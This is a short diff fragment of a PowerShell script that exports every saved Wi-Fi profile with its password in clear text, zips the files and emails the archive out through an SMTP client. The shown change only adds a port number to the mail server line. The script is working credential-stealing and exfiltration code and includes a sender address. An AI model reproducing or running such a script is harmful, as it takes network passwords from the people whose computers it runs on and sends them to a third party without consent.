@@ -18,7 +18,7 @@ netsh wlan export profile key=clear
 Compress-Archive -Path * -DestinationPath wifi.zip
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("10.10.0.3")
+$smtp = new-object Net.Mail.SmtpClient("10.10.0.3","25")
 #$smtp.Credentials = New-Object System.Net.NetworkCredential("georges.lariviere@setln.fr", $pass1);
 $smtp.EnableSsl = $false
 $Message.From = "georges.lariviere@setln.fr"
